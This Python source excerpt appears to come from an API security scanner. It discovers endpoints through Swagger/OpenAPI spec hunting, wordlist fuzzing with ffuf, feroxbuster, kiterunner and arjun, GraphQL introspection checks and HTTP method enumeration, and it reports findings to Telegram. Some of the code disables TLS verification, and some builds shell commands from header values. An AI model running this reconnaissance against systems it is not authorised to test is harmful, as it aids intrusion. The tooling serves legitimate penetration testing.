        self.base_url  = base_url.rstrip("/")
        self.timeout   = timeout
        self.refresher = refresher   # TokenRefresher instance or None
        self.headers   = dict(self.DEFAULT_HEADERS)
        if token:
            self.headers["Authorization"] = f"Bearer {token}"
        if api_key:
            self.headers["X-API-Key"] = api_key
        if extra_headers:
            self.headers.update(extra_headers)
        self.session: Optional[aiohttp.ClientSession] = None

    async def _refresh_if_needed(self):
        """If a refresher is configured, get fresh token and update headers + session."""
        if not self.refresher:
            return
        token = await self.refresher.get_token()
        if token:
            new_auth = f"Bearer {token}"
            if self.headers.get("Authorization") != new_auth:
                self.headers["Authorization"] = new_auth
                # Re-create session with updated headers so all future requests use new token
                if self.session:
                    await self.session.close()
                connector = aiohttp.TCPConnector(ssl=False, limit=50)
                self.session = aiohttp.ClientSession(
                    headers=self.headers,
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                    connector=connector)

    async def __aenter__(self):
        connector = aiohttp.TCPConnector(ssl=False, limit=50)
        self.session = aiohttp.ClientSession(
            headers=self.headers,
            timeout=aiohttp.ClientTimeout(total=self.timeout),
            connector=connector)
        # Fetch initial token if refresher is configured
        if self.refresher:
            inf("Auto token refresh enabled — fetching initial token...")
            await self._refresh_if_needed()
        return self

    async def __aexit__(self, *args):
        if self.session:
            await self.session.close()

    async def request(self, method: str, path: str, **kwargs) -> Optional[aiohttp.ClientResponse]:
        url = f"{self.base_url}{path}" if path.startswith("/") else path
        # Refresh token before every request if needed (no-op if not expired)
        await self._refresh_if_needed()
        try:
            resp = await self.session.request(method, url, **kwargs)
            return resp
        except asyncio.TimeoutError:
            return None
        except Exception:
            return None

    async def get(self, path: str, **kwargs):
        return await self.request("GET", path, **kwargs)

    async def post(self, path: str, **kwargs):
        return await self.request("POST", path, **kwargs)

# TOKEN REFRESHER — Auto-refresh short-lived tokens (client_credentials, etc.)
class TokenRefresher:
    def __init__(self, cfg: dict):
        self.url           = cfg.get("url", "")
        self.grant_type    = cfg.get("grant_type", "client_credentials")
        self.client_id     = cfg.get("client_id", "")
        self.client_secret = cfg.get("client_secret", "")
        self.basic_auth    = cfg.get("basic_auth", "")   # prebuilt Basic header value
        self.username      = cfg.get("username", "")
        self.password      = cfg.get("password", "")
        self.refresh_token = cfg.get("refresh_token", "")
        self.script        = cfg.get("script", "")
        self.buffer        = int(cfg.get("refresh_buffer", 30))
        self.token_field   = cfg.get("token_field", "access_token")
        self.extra_body    = cfg.get("extra_body", {})   # any extra form fields

        self._token:   Optional[str] = None
        self._expiry:  float = 0.0
        self._lock     = asyncio.Lock()

    def _is_expired(self) -> bool:
        return self._token is None or time.time() >= (self._expiry - self.buffer)

    async def get_token(self) -> Optional[str]:
        """Return current token, refreshing first if needed."""
        if self._is_expired():
            async with self._lock:
                if self._is_expired():   # double-check after lock
                    await self._fetch()
        return self._token

    async def _fetch(self):
        """Perform the actual token fetch based on grant_type."""
        try:
            if self.grant_type == "custom_script":
                await self._fetch_via_script()
            else:
                await self._fetch_via_http()
        except Exception as ex:
            warn(f"Token refresh failed: {ex}")

    async def _fetch_via_http(self):
        headers = {"Content-Type": "application/x-www-form-urlencoded",
                   "Accept": "application/json"}

        # Build Authorization header
        if self.basic_auth:
            headers["Authorization"] = self.basic_auth
        elif self.client_id and self.client_secret:
            import base64 as _b64
            creds = _b64.b64encode(
                f"{self.client_id}:{self.client_secret}".encode()).decode()
            headers["Authorization"] = f"Basic {creds}"

        # Build body
        body: dict = {"grant_type": self.grant_type, **self.extra_body}
        if self.grant_type == "client_credentials":
            if not self.basic_auth:   # only add if not using Basic header
                body["client_id"]     = self.client_id
                body["client_secret"] = self.client_secret
        elif self.grant_type == "password":
            body["username"] = self.username
            body["password"] = self.password
            if self.client_id:
                body["client_id"]     = self.client_id
                body["client_secret"] = self.client_secret
        elif self.grant_type == "refresh_token":
            body["refresh_token"] = self.refresh_token
            if self.client_id:
                body["client_id"] = self.client_id

        async with aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=15),
                connector=aiohttp.TCPConnector(ssl=False)) as s:
            async with s.post(self.url, data=body, headers=headers) as r:
                text = await r.text()
                if r.status != 200:
                    warn(f"Token refresh HTTP {r.status}: {text[:200]}")
                    return
                data = json.loads(text)
                token = data.get(self.token_field)
                if not token:
                    warn(f"Token refresh: field '{self.token_field}' not in response: {text[:200]}")
                    return
                expires_in = int(data.get("expires_in", 300))
                self._token  = token
                self._expiry = time.time() + expires_in
                expiry_str   = datetime.fromtimestamp(self._expiry).strftime("%H:%M:%S")
                ok(f"Token refreshed — expires in {expires_in}s (at {expiry_str})")

                # If it was a refresh_token grant, update stored refresh_token if new one issued
                if self.grant_type == "refresh_token" and data.get("refresh_token"):
                    self.refresh_token = data["refresh_token"]

    async def _fetch_via_script(self):
        if not self.script:
            warn("Token refresh: grant_type=custom_script but no 'script' path set")
            return
        proc = await asyncio.create_subprocess_exec(
            *self.script.split(),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE)
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
        token = stdout.decode().strip()
        if not token:
            warn(f"Token refresh script returned empty output. stderr: {stderr.decode()[:200]}")
            return
        # Scripts should output: <token> or <token> <expires_in>
        parts = token.split()
        self._token  = parts[0]
        expires_in   = int(parts[1]) if len(parts) > 1 else 270
        self._expiry = time.time() + expires_in
        ok(f"Token refreshed via script — expires in {expires_in}s")

# PHASE 1 — ENDPOINT DISCOVERY
def _extract_example(schema: dict) -> str:
    if not schema:
        return "1"
    # Direct example field
    if "example" in schema:
        return str(schema["example"])
    # enum — use first value
    if "enum" in schema and schema["enum"]:
        return str(schema["enum"][0])
    # type-based fallbacks
    t = schema.get("type", "string")
    if t == "integer":  return "1"
    if t == "number":   return "1.0"
    if t == "boolean":  return "true"
    return "test"

def _schema_to_example_body(schema: dict) -> dict:
    if not schema or not isinstance(schema, dict):
        return {}
    if schema.get("type") == "object" or "properties" in schema:
        body = {}
        for field, fschema in schema.get("properties", {}).items():
            if "example" in fschema:
                body[field] = fschema["example"]
            elif fschema.get("type") == "integer":
                body[field] = 1
            elif fschema.get("type") == "boolean":
                body[field] = False
            elif fschema.get("type") == "array":
                body[field] = []
            else:
                body[field] = "test"
        return body
    if "example" in schema:
        return schema["example"]
    return {}

def _parse_spec_data(data: dict) -> List[Dict]:

    endpoints = []
    paths = data.get("paths", {})

    for path, path_item in paths.items():
        if not isinstance(path_item, dict):
            continue
        # Path-level parameters (shared across methods)
        shared_params = path_item.get("parameters", [])

        for method, op in path_item.items():
            if method.lower() not in ["get","post","put","patch","delete","options","head"]:
                continue
            if not isinstance(op, dict):
                continue

            # Merge path-level + operation-level parameters
            all_params = shared_params + op.get("parameters", [])

            path_params:   List[str] = []
            query_params:  List[str] = []
            header_params: List[str] = []
            path_param_examples: Dict[str, str] = {}

            for p in all_params:
                if not isinstance(p, dict):
                    continue
                name   = p.get("name", "")
                loc    = p.get("in", "")
                schema = p.get("schema", {})
                # Also check top-level example (Swagger 2.0 style)
                if not schema and "example" in p:
                    schema = {"example": p["example"]}

                if loc == "path":
                    path_params.append(name)
                    path_param_examples[name] = _extract_example(schema)
                elif loc == "query":
                    query_params.append(name)
                elif loc == "header":
                    header_params.append(name)

            # Request body schema
            body_schema      = None
            example_body     = {}
            body_field_names: List[str] = []

            # OpenAPI 3.x requestBody
            if "requestBody" in op:
                rb      = op["requestBody"]
                content = rb.get("content", {})
                # Prefer application/json
                for ct in ["application/json", "application/x-www-form-urlencoded"]:
                    if ct in content:
                        body_schema  = content[ct].get("schema")
                        example_body = _schema_to_example_body(body_schema)
                        break
                if not body_schema and content:
                    first = next(iter(content.values()))
                    body_schema  = first.get("schema")
                    example_body = _schema_to_example_body(body_schema)

            # Swagger 2.0 body/formData params
            for p in all_params:
                if p.get("in") == "body":
                    body_schema  = p.get("schema")
                    example_body = _schema_to_example_body(body_schema)
                elif p.get("in") == "formData":
                    example_body[p["name"]] = _extract_example(p.get("schema", {}))

            if body_schema and isinstance(body_schema, dict):
                body_field_names = list(body_schema.get("properties", {}).keys())

            # Build concrete example path using real example values
            example_path = path
            for pp_name, pp_val in path_param_examples.items():
                example_path = example_path.replace(f"{{{pp_name}}}", pp_val)
            # Fallback: replace any remaining {param} with "1"
            example_path = re.sub(r'\{[^}]+\}', '1', example_path)

            # Requires auth?
            requires_auth = bool(op.get("security") or data.get("security"))

            endpoints.append({
                "method":              method.upper(),
                "path":                path,
                "example_path":        example_path,
                "path_params":         path_params,
                "path_param_examples": path_param_examples,
                "query_params":        query_params,
                "header_params":       header_params,
                "body_schema":         body_schema,
                "body_fields":         body_field_names,
                "example_body":        example_body,
                "summary":             op.get("summary", ""),
                "tags":                op.get("tags", []),
                "requires_auth":       requires_auth,
                "from_spec":           True,
            })
    return endpoints

# external tool runners

def _tool_status() -> str:
    tools = [
        ("ffuf",        TOOL_FFUF),
        ("arjun",       TOOL_ARJUN),
        ("kiterunner",  TOOL_KR),
        ("feroxbuster", TOOL_FEROX),
        ("nikto",       TOOL_NIKTO),
        ("nuclei",      TOOL_NUCLEI),
        ("jwt_tool",    TOOL_JWT_TOOL),
    ]
    wls = [
        ("endpoints-wl", WL_API_ENDPOINTS),
        ("params-wl",    WL_PARAMS),
        ("kr-routes",    WL_KR_ROUTES),
        ("passwords-wl", WL_PASSWORDS),
    ]
    t_str = "  ".join(
        f"[green]{n}[/green]" if p else f"[dim]{n}[/dim]"
        for n, p in tools
    )
    w_str = "  ".join(
        f"[green]{n}[/green]" if p else f"[dim]{n}[/dim]"
        for n, p in wls
    )
    return f"tools: {t_str}\n  wordlists: {w_str}"

async def run_ffuf(base_url: str, out_dir: Path,
                   auth_headers: Dict[str, str],
                   extra_paths: Optional[str] = None) -> List[str]:
    """
    Run ffuf for API endpoint discovery.
    """
    if not TOOL_FFUF:
        return []

    wordlist = extra_paths or WL_API_ENDPOINTS
    if not wordlist:
        inf("ffuf: no wordlist found — skipping (install seclists: apt install seclists)")
        return []

    out_json = str(out_dir / "ffuf_results.json")
    # Build header flags
    hdr_flags = " ".join(f'-H "{k}: {v}"' for k, v in auth_headers.items()
                         if k.lower() not in ["content-length"])
    cmd = (
        f'{TOOL_FFUF} -u "{base_url}/FUZZ" '
        f'-w "{wordlist}" '
        f'-mc 200,201,204,301,302,307,401,403,405 '
        f'-of json -o "{out_json}" '
        f'-t 40 -timeout 8 -r '
        f'-ac '           # auto-calibrate to filter false positives
        f'{hdr_flags} '
        f'-s '            # silent (no progress bar)
        f'2>/dev/null'
    )
    inf(f"ffuf running [{Path(wordlist).name}] ...")
    rc, out, err = await run(cmd, 300)

    paths: List[str] = []
    try:
        if Path(out_json).exists():
            data = json.loads(Path(out_json).read_text())
            for r in data.get("results", []):
                u = r.get("url", "")
                if u:
                    p = "/" + u.replace(base_url, "").lstrip("/")
                    paths.append(p)
            ok(f"ffuf: {len(paths)} endpoints found  [credits: ffuf/joohoi]")
    except Exception as ex:
        warn(f"ffuf parse error: {ex}")

    return paths

async def run_feroxbuster(base_url: str, out_dir: Path,
                          auth_headers: Dict[str, str]) -> List[str]:
    """
    Run feroxbuster for recursive directory/endpoint discovery.
    """
    if not TOOL_FEROX:
        return []

    wordlist = WL_API_ENDPOINTS
    if not wordlist:
        return []

    out_file = str(out_dir / "ferox_results.txt")
    hdr_flags = " ".join(f'-H "{k}: {v}"' for k, v in auth_headers.items()
                         if k.lower() not in ["content-length"])
    cmd = (
        f'{TOOL_FEROX} --url "{base_url}" '
        f'-w "{wordlist}" '
        f'--status-codes 200,201,204,301,302,307,401,403,405 '
        f'--output "{out_file}" '
        f'--threads 30 --timeout 8 '
        f'--no-recursion '          # stay shallow for APIs
        f'--silent '
        f'--auto-tune '
        f'{hdr_flags} '
        f'2>/dev/null'
    )
    inf("feroxbuster running ...")
    rc, out, err = await run(cmd, 300)

    paths: List[str] = []
    try:
        if Path(out_file).exists():
            for line in Path(out_file).read_text().splitlines():
                # ferox output: STATUS SIZE WORDS LINES URL
                parts = line.split()
                if len(parts) >= 5 and parts[0].isdigit():
                    url = parts[-1]
                    p = "/" + url.replace(base_url, "").lstrip("/")
                    if p and p != "/":
                        paths.append(p)
            ok(f"feroxbuster: {len(paths)} endpoints  [credits: feroxbuster/epi052]")
    except Exception as ex:
        warn(f"feroxbuster parse error: {ex}")

    return paths

async def run_kiterunner(base_url: str, out_dir: Path,
                         auth_headers: Dict[str, str]) -> List[str]:
    """
    Run kiterunner for API-spec-aware route bruteforcing.
    """
    if not TOOL_KR:
        return []

    routes = WL_KR_ROUTES
    if not routes:
        inf("kiterunner: no .kite routes file found — skipping")
        inf("  Download: https://github.com/assetnote/kiterunner#wordlists")
        return []

    out_file = str(out_dir / "kr_results.txt")
    # Build auth header string for kr: "Key: Value"
    hdr_str = " ".join(f'-H "{k}: {v}"' for k, v in auth_headers.items()
                       if k.lower() not in ["content-length"])
    cmd = (
        f'{TOOL_KR} scan "{base_url}" '
        f'-w "{routes}" '
        f'--ignore-length 34 '
        f'--max-connection-per-host 30 '
        f'--timeout 8000 '
        f'{hdr_str} '
        f'2>/dev/null | tee "{out_file}"'
    )
    inf("kiterunner scanning ...")
    rc, out, err = await run(cmd, 360)

    paths: List[str] = []
    try:
        for line in (out or "").splitlines():
            # kr output has: STATUS Size WORDS Path
            m = re.search(r'(GET|POST|PUT|DELETE|PATCH)\s+(\S+)\s', line)
            if not m:
                m = re.search(r'https?://\S+(/\S+)', line)
            if m:
                p = m.group(2) if m.lastindex >= 2 else m.group(1)
                if p.startswith("/"):
                    paths.append(p)
        ok(f"kiterunner: {len(paths)} routes  [credits: kiterunner/assetnote]")
    except Exception as ex:
        warn(f"kiterunner parse error: {ex}")

    return paths

async def run_arjun(url: str, out_dir: Path,
                    auth_headers: Dict[str, str]) -> Dict[str, List[str]]:
    """
    Run arjun for hidden parameter discovery on a single endpoint.
    """
    if not TOOL_ARJUN:
        return {}

    out_json = str(out_dir / f"arjun_{hashlib.md5(url.encode()).hexdigest()[:8]}.json")
    hdr_flags = " ".join(f'--headers "{k}: {v}"'
                         for k, v in auth_headers.items()
                         if k.lower() not in ["content-length"])

    wl_flag = f'-w "{WL_PARAMS}"' if WL_PARAMS else ""
    cmd = (
        f'{TOOL_ARJUN} -u "{url}" '
        f'{wl_flag} '
        f'--stable '
        f'-oJ "{out_json}" '
        f'{hdr_flags} '
        f'-q '          # quiet
        f'2>/dev/null'
    )
    rc, out, err = await run(cmd, 120)

    params: Dict[str, List[str]] = {}
    try:
        if Path(out_json).exists():
            data = json.loads(Path(out_json).read_text())
            # arjun output: {url: [params]} or {"parameters": [...]}
            if isinstance(data, dict):
                for k, v in data.items():
                    if isinstance(v, list):
                        params[k] = v
                    elif k == "parameters":
                        params[url] = v
    except Exception as ex:
        pass

    return params

async def phase_discovery(base_url: str, D: OutputDirs, client: APIClient,
                           tg: TelegramNotifier, stats: dict,
                           local_spec: str = None) -> List[Dict]:
    pb(1, "API ENDPOINT DISCOVERY")

    # Show installed tools and wordlists
    console.print(f"  {_tool_status()}")

    found_endpoints: List[Dict] = []
    spec_endpoints: List[Dict] = []   # rich endpoint objects parsed from spec

    # LOCAL SPEC FILE (--spec flag)
    if local_spec:
        try:
            spec_path = Path(local_spec)
            if not spec_path.exists():
                warn(f"Spec file not found: {local_spec}")
            else:
                raw = spec_path.read_text(encoding="utf-8")
                try:
                    data = json.loads(raw)
                except Exception:
                    data = yaml.safe_load(raw)

                spec_endpoints = _parse_spec_data(data)
                ok(f"Spec: {spec_path.name} — {len(spec_endpoints)} endpoints parsed")

                # ── Rich endpoint table ──────────────────────────────────────────
                # Show everything the parser extracted so you can verify the spec
                # was read correctly before committing to a long scan.
                console.print()
                console.print(f"  [bold white]Parsed endpoints from spec:[/bold white]")
                console.print()
                t = Table(box=box.SIMPLE, show_header=True, padding=(0,1),
                          header_style="bold dim")
                t.add_column("#",          style="dim",       width=4)
                t.add_column("METHOD",     style="bold cyan", width=8)
                t.add_column("PATH",       style="white",     min_width=30)
                t.add_column("AUTH",       width=5)
                t.add_column("PATH PARAMS",style="dim",       min_width=20)
                t.add_column("BODY FIELDS",style="dim",       min_width=20)
                t.add_column("SUMMARY",    style="dim italic",min_width=20)

                METHOD_COLOR = {
                    "GET":"green","POST":"yellow","PUT":"blue",
                    "PATCH":"magenta","DELETE":"red","HEAD":"cyan","OPTIONS":"dim"
                }

                for idx, ep in enumerate(spec_endpoints, 1):
                    mc    = METHOD_COLOR.get(ep["method"], "white")
                    auth  = "[green]✓[/green]" if ep.get("requires_auth") else "[dim]-[/dim]"

                    # Path params — flag UUIDs so we know BOLA needs real UUIDs
                    pp_raw = ep.get("path_params", [])
                    pp_str = ", ".join(
                        f"[yellow]{p}[/yellow]" if "uuid" in str(ep.get("path_param_examples",{}).get(p,"")).lower()
                                                 or p.lower() in ["tenantid","terminalid","sinktype","id","uuid"]
                        else f"[dim]{p}[/dim]"
                        for p in pp_raw
                    ) or "[dim]-[/dim]"

                    # Body fields — first 4, truncate rest
                    bf     = ep.get("body_fields", [])
                    bf_str = ", ".join(bf[:4]) + (f" +{len(bf)-4}" if len(bf) > 4 else "") if bf else "[dim]-[/dim]"

                    summary = (ep.get("summary","") or "")[:35]

                    t.add_row(
                        str(idx),
                        f"[{mc}]{ep['method']}[/{mc}]",
                        ep["path"],
                        auth,
                        pp_str,
                        bf_str,
                        summary,
                    )

                console.print(t)
                console.print(f"  [dim]yellow path params = UUID-typed (BOLA needs real UUIDs for these)[/dim]")
                console.print()

                # Save copy into output
                (D.spec / f"local_{spec_path.name}").write_text(raw[:500_000])
                sjson(D.spec / "from_local_spec.json", spec_endpoints)

                # ── Spec-mode: use spec endpoints ONLY, no fuzzing ──────────────
                # When a spec file is provided we already know exactly what exists.
                # Running a wordlist fuzz on top of that adds noise and goes out
                # of scope — skip all fuzzing and just test what the spec defines.
                stats["spec_mode"] = True
                stats["spec_endpoint_list"] = [
                    {
                        "method":      e["method"],
                        "path":        e["path"],
                        "example_path":e["example_path"],
                        "auth":        e.get("requires_auth", False),
                        "body_fields": e.get("body_fields", []),
                        "path_params": e.get("path_params", []),
                        "query_params":e.get("query_params", []),
                        "summary":     e.get("summary", ""),
                        "tags":        e.get("tags", []),
                    }
                    for e in spec_endpoints
                ]
                ok(f"Spec-mode enabled — fuzzing disabled, testing {len(spec_endpoints)} spec endpoints only")
        except Exception as ex:
            warn(f"Could not parse local spec file: {ex}")

    # Spec file detection
    inf("Hunting for spec files (OpenAPI/Swagger/GraphQL)...")
    spec_paths = [
        "/swagger.json", "/swagger.yaml", "/swagger.yml",
        "/openapi.json", "/openapi.yaml", "/openapi.yml",
        "/api-docs", "/api-docs.json", "/api-docs.yaml",
        "/api/swagger.json", "/api/openapi.json",
        "/api/v1/swagger.json", "/api/v2/swagger.json",
        "/api/v3/swagger.json", "/v1/openapi.json",
        "/api/schema.json", "/schema.json",
        "/swagger/v1/swagger.json", "/swagger/ui/index",
        "/.well-known/openid-configuration",
        "/graphql/schema", "/api/graphql/schema",
    ]
    spec_found = []
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for path in spec_paths:
            try:
                async with s.get(f"{base_url}{path}") as r:
                    if r.status in [200, 301, 302]:
                        text = await r.text()
                        if any(kw in text.lower() for kw in
                               ["swagger", "openapi", "paths", "components", "__schema", "definitions"]):
                            spec_found.append({"path": path, "status": r.status, "size": len(text)})
                            # Save spec
                            sname = safe_name(path)
                            (D.spec / f"{sname}.txt").write_text(text[:500_000])
                            ok(f"[bold green]SPEC FILE: {path} ({r.status})[/bold green]")
                            tg.queue_finding("HIGH", "API Spec Exposed",
                                                   f"Spec file found: {base_url}{path}")
            except: pass

    if spec_found:
        sjson(D.spec / "spec_files_found.json", spec_found)
        stats["spec_files"] = len(spec_found)

    # Parse OpenAPI/Swagger to extract endpoints
    parsed_from_spec: List[str] = []
    for sf in spec_found:
        try:
            fpath = D.spec / f"{safe_name(sf['path'])}.txt"
            content = fpath.read_text()
            try:
                data = json.loads(content)
            except:
                try:
                    data = yaml.safe_load(content)
                except:
                    continue
            # Extract paths
            paths = data.get("paths", {})
            for p, methods in paths.items():
                for method in methods:
                    if method.lower() in [m.lower() for m in HTTP_METHODS]:
                        parsed_from_spec.append(f"{method.upper()} {p}")
            if parsed_from_spec:
                ok(f"Parsed {len(parsed_from_spec)} endpoints from spec")
                (D.endpoints / "from_spec.txt").write_text("\n".join(parsed_from_spec))
                # Add spec paths to fuzz list so they get probed
                for entry in parsed_from_spec:
                    parts = entry.split(" ", 1)
                    if len(parts) == 2:
                        path = parts[1]
                        if path not in API_PATHS:
                            API_PATHS.append(path)
        except Exception as ex:
            console.print(f"  [dim]Spec parse error: {ex}[/dim]")

    # Spec-mode vs fuzzing mode
    # When a spec is provided we know exactly what endpoints exist and what
    # the scope is. Skip all fuzzing entirely and build live_paths directly
    # from the spec. This avoids going out of scope and cuts scan time.
    live_paths: List[Dict] = []

    if stats.get("spec_mode") and spec_endpoints:
        inf(f"Spec-mode: probing {len(spec_endpoints)} spec endpoints (no fuzzing)...")

        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=12),
                                          connector=aiohttp.TCPConnector(ssl=False, limit=50)) as s:
            sem = asyncio.Semaphore(20)

            async def probe_spec_ep(ep: dict):
                async with sem:
                    try:
                        url = f"{base_url}{ep['example_path']}"
                        method = ep["method"].upper()
                        # Use a minimal valid body for write methods
                        body_data = json.dumps(ep.get("example_body") or {}) if method in ["POST","PUT","PATCH"] else None
                        req_headers = {**client.headers}
                        if body_data:
                            req_headers["Content-Type"] = "application/json"

                        async with s.request(method, url, headers=req_headers,
                                              data=body_data,
                                              allow_redirects=False) as r:
                            ct   = r.headers.get("Content-Type", "")
                            body = await r.text()
                            status_str = {200:"[green]200 OK[/green]",
                                          201:"[green]201 Created[/green]",
                                          204:"[green]204 No Content[/green]",
                                          400:"[yellow]400 Bad Request[/yellow]",
                                          401:"[yellow]401 Unauthorized[/yellow]",
                                          403:"[yellow]403 Forbidden[/yellow]",
                                          404:"[dim]404 Not Found[/dim]",
                                          405:"[dim]405 Method Not Allowed[/dim]",
                                          500:"[red]500 Server Error[/red]"}.get(r.status, f"{r.status}")
                            console.print(f"  {status_str}  {method:7} {ep['example_path']}")
                            # Add to live_paths for subsequent phases
                            # Include spec metadata so injection/BOLA phases use right fields
                            live_paths.append({
                                "path":         ep["example_path"],
                                "status":       r.status,
                                "size":         len(body),
                                "content_type": ct,
                                "url":          url,
                                "method":       method,
                                "from_spec":    True,
                                "path_params":  ep.get("path_params", []),
                                "query_params": ep.get("query_params", []),
                                "body_schema":  ep.get("body_schema", {}),
                                "body_fields":  ep.get("body_fields", []),
                                "example_body": ep.get("example_body", {}),
                                "summary":      ep.get("summary", ""),
                                "requires_auth":ep.get("requires_auth", False),
                            })
                    except Exception as ex:
                        inf(f"  probe error {ep['example_path']}: {ex}")

            tasks = [probe_spec_ep(ep) for ep in spec_endpoints]
            await asyncio.gather(*tasks)

        ok(f"Spec probe complete — {len(live_paths)} endpoints responded (non-404)")

    else:
        # No spec: run external fuzzers + built-in scanner
        ext_paths: Set[str] = set()

        if TOOL_FFUF or TOOL_FEROX or TOOL_KR:
            inf("Running external fuzzers in parallel with built-in scanner...")
            if TOOL_FFUF:
                ffuf_paths = await run_ffuf(base_url, D.endpoints, client.headers)
                ext_paths.update(ffuf_paths)
            elif TOOL_FEROX:
                ferox_paths = await run_feroxbuster(base_url, D.endpoints, client.headers)
                ext_paths.update(ferox_paths)
            if TOOL_KR:
                kr_paths = await run_kiterunner(base_url, D.endpoints, client.headers)
                ext_paths.update(kr_paths)
            for p in ext_paths:
                if p not in API_PATHS:
                    API_PATHS.append(p)
            if ext_paths:
                ok(f"External tools found {len(ext_paths)} additional paths — merged into scan queue")
        else:
            inf("No external fuzzers installed (ffuf/feroxbuster/kiterunner)")
            inf("  Install: apt install ffuf  |  or: go install github.com/ffuf/ffuf/v2@latest")

        inf(f"Fuzzing {len(API_PATHS)} common API paths...")

        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=12),
                                          connector=aiohttp.TCPConnector(ssl=False, limit=50)) as s:
            sem = asyncio.Semaphore(30)

            async def check_path(path: str):
                async with sem:
                    try:
                        url = f"{base_url}{path}"
                        async with s.get(url, headers=client.headers,
                                          allow_redirects=False) as r:
                            ct = r.headers.get("Content-Type", "")
                            body = await r.text()
                            fake_404 = (
                                len(body) < 20 and r.status == 200
                            ) or any(kw in body.lower()[:200] for kw in [
                                "404 not found", "page not found", "no page found"
                            ])
                            if r.status not in [404] and not fake_404:
                                entry = {
                                    "path": path, "status": r.status,
                                    "size": len(body), "content_type": ct,
                                    "url": url,
                                }
                                live_paths.append(entry)
                                if r.status == 200:
                                    ok(f"  [{path}] 200 OK ({len(body)}b)")
                                elif r.status == 403:
                                    ok(f"  [{path}] 403 Forbidden — try bypass")
                                elif r.status == 401:
                                    ok(f"  [{path}] 401 Unauthorized")
                                elif r.status in [301, 302]:
                                    ok(f"  [{path}] {r.status} Redirect")
                    except: pass

            tasks = [check_path(p) for p in API_PATHS]
            await asyncio.gather(*tasks)

    # Save results
    sjson(D.endpoints / "discovered_paths.json", live_paths)
    found_200  = [e for e in live_paths if e["status"] == 200]
    found_403  = [e for e in live_paths if e["status"] == 403]
    found_401  = [e for e in live_paths if e["status"] == 401]
    found_redir= [e for e in live_paths if e["status"] in [301, 302]]

    (D.endpoints / "status_200.txt").write_text("\n".join(e["url"] for e in found_200))
    (D.endpoints / "status_403.txt").write_text("\n".join(e["url"] for e in found_403))
    (D.endpoints / "status_401.txt").write_text("\n".join(e["url"] for e in found_401))

    # Arjun — hidden parameter discovery on top live endpoints
    arjun_results: Dict[str, List[str]] = {}
    if TOOL_ARJUN and found_200:
        inf(f"arjun: discovering hidden params on top {min(5,len(found_200))} endpoints...")
        arjun_dir = D.endpoints / "arjun"
        arjun_dir.mkdir(exist_ok=True)
        for ep in found_200[:5]:
            res = await run_arjun(ep["url"], arjun_dir, client.headers)
            arjun_results.update(res)
        if arjun_results:
            sjson(D.endpoints / "arjun_params.json", arjun_results)
            total_params = sum(len(v) for v in arjun_results.values())
            ok(f"arjun: {total_params} hidden params found across {len(arjun_results)} endpoints  [credits: arjun/s0md3v]")
            for url, params in arjun_results.items():
                warn(f"Hidden params @ {url}: {', '.join(params[:8])}")
    elif not TOOL_ARJUN:
        inf("arjun not installed — skipping param discovery (pip install arjun)")

    graphql_found = False
    graphql_endpoints = []
    for entry in live_paths:
        if "graphql" in entry["path"].lower():
            graphql_endpoints.append(entry)

    if graphql_endpoints:
        inf("Testing GraphQL introspection...")
        for ep in graphql_endpoints:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10),
                                              connector=aiohttp.TCPConnector(ssl=False)) as s:
                for q in GRAPHQL_QUERIES:
                    try:
                        async with s.post(ep["url"], data=q,
                                           headers={**client.headers,
                                                    "Content-Type": "application/json"}) as r:
                            body = await r.text()
                            if '"__schema"' in body or '"data"' in body:
                                graphql_found = True
                                (D.spec / "graphql_introspection.json").write_text(body[:500_000])
                                warn(f"GraphQL introspection ENABLED at {ep['url']}")
                                tg.queue_finding("HIGH", "GraphQL Introspection Enabled",
                                                       f"Introspection at {ep['url']}")
                                found_endpoints.append({
                                    "type": "GraphQL Introspection",
                                    "url": ep["url"], "severity": "HIGH"
                                })
                                break
                    except: pass

    # HTTP method enumeration on live paths
    inf("HTTP method enumeration on discovered endpoints...")
    method_findings: List[Dict] = []
    test_endpoints = found_200[:10] + found_403[:5]

    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8),
                                      connector=aiohttp.TCPConnector(ssl=False)) as s:
        for ep in test_endpoints[:10]:
            allowed = []
            for method in ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "TRACE"]:
                try:
                    async with s.request(method, ep["url"],
                                          headers=client.headers) as r:
                        if r.status not in [404, 405]:
                            allowed.append(f"{method}:{r.status}")
                except: pass
            if "TRACE" in str(allowed):
                method_findings.append({
                    "url": ep["url"], "methods": allowed,
                    "issue": "TRACE enabled — XST risk"
                })
                warn(f"TRACE enabled: {ep['url']}")
            if len([m for m in allowed if m.split(":")[0] not in ["GET", "HEAD", "OPTIONS"]]) > 2:
                method_findings.append({
                    "url": ep["url"], "methods": allowed,
                    "issue": "Many HTTP methods allowed"
                })

    sjson(D.endpoints / "http_methods.json", method_findings)

    # Merge spec_endpoints into live_paths
    # spec_endpoints may have paths not reached by fuzzing (auth-protected, etc.)
    # Add them as "spec-only" entries so all phases can test them
    fuzzed_paths = {e["path"] for e in live_paths}
    spec_only_added = 0
    for ep in spec_endpoints:
        if ep["example_path"] not in fuzzed_paths and ep["path"] not in fuzzed_paths:
            live_paths.append({
                "path":         ep["example_path"],
                "status":       0,      # unknown — not fuzzed, from spec
                "size":         0,
                "content_type": "",
                "url":          f"{base_url}{ep['example_path']}",
                "from_spec":    True,
                "method":       ep["method"],
                "path_params":  ep["path_params"],
                "query_params": ep["query_params"],
                "body_schema":  ep["body_schema"],
                "summary":      ep["summary"],
            })
            spec_only_added += 1

    if spec_only_added:
        ok(f"Added {spec_only_added} spec-only endpoints (not found by fuzzing) to test queue")

    # Build final endpoint list
    all_endpoints = list({e["url"] for e in live_paths})
    all_endpoints += [e.split(" ", 1)[1] for e in parsed_from_spec
                      if e.split(" ", 1)[1] not in all_endpoints]

    (D.endpoints / "all_endpoints.txt").write_text("\n".join(all_endpoints))

    # Save rich spec endpoint list for other phases to use
    if spec_endpoints:
        sjson(D.endpoints / "spec_endpoints_full.json", spec_endpoints)

    stats["endpoints_found"] = len(all_endpoints)
